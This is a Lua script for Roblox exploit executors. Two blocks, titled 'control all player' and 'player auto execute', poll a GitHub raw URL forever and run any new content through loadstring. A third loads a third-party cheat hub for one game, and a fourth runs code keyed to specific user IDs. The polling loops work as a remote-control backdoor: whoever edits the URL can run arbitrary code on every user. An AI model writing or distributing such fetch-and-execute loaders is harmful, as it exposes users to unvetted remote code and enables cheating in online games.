---------------------------------------------------------------------------------------------------------

-- control all player













local scriptUrl = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/all_plyer_control.lua"

local lastContent = ""

task.spawn(function()
    while true do
        local success, content = pcall(function()
            return game:HttpGet(scriptUrl)
        end)
        
        if success and content and content:match("%S") and content ~= lastContent then
            lastContent = content
            pcall(function()
                local loadedFunc = loadstring(content)
                if loadedFunc then
                    loadedFunc()
                end
            end)
        end
        
        task.wait()
    end
end)














-----------------------------------------------------------------------------------------------------------

-- player auto execute

















local autoexecutes = "https://raw.githubusercontent.com/BRGTscript/controling/refs/heads/main/all_plyer_control.lua"

local lastContent1 = ""

task.spawn(function()
    while true do
        local success, content = pcall(function()
            return game:HttpGet(autoexecutes)
        end)
        
        if success and content and content:match("%S") and content ~= lastContent1 then
            lastContent1 = content
            pcall(function()
                local loadedFunc = loadstring(content)
                if loadedFunc then
                    loadedFunc()
                end
            end)
        end
        
        task.wait()
    end
end)





















----------------------------------------------------------------------------------------------------------------

-- game script control

















if not game:IsLoaded() then
    game.Loaded:Wait()
end

local SupportedGames = {

-- script



[107778070777162] = function()     -- STEAL AN EGG

        loadstring(game:HttpGet("https://raw.githubusercontent.com/Ryuun0x/Clover/refs/heads/main/main.lua"))()  -- CLOVER HUB



    end,












}

local currentPlaceId = game.PlaceId
local scriptToExecute = SupportedGames[currentPlaceId]

if scriptToExecute then
    scriptToExecute()
end






















--------------------------------------------------------------------------------------------------------------

-- player control
















if not game:IsLoaded() then
    game.Loaded:Wait()
end

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer or Players.PlayerAdded:Wait()


local Playercontrol = {


-------------------------------------------------------------------------------------------

-- xian



[10985692688] = function()  -- xianpog8839

-- anti lag
local Terrain = workspace:FindFirstChildOfClass('Terrain')
if Terrain then
    Terrain.WaterWaveSize = 0
    Terrain.WaterWaveSpeed = 0
    Terrain.WaterReflectance = 0
    Terrain.WaterTransparency = 0
end

game:GetService("Lighting").GlobalShadows = false
game:GetService("Lighting").FogEnd = 9e9

for _, v in pairs(game:GetDescendants()) do
    if v:IsA("Part") or v:IsA("UnionOperation") or v:IsA("MeshPart") then
        v.Material = Enum.Material.SmoothPlastic
        v.Reflectance = 0
    elseif v:IsA("Decal") or v:IsA("Texture") then
        v:Destroy()
    elseif v:IsA("ParticleEmitter") or v:IsA("Trail") or v:IsA("Smoke") or v:IsA("Fire") then
        v.Enabled = false
    end
end
------------------------------




end,



--------------------------------------------------

-- enzo


[1561035140] = function()  -- spylil123

print("lil phonk")

end,










}


local currentUserId = LocalPlayer.UserId
local targetScript = Playercontrol[currentUserId]


if targetScript then
    targetScript()
end






---------------------------------------------------------------------------------------
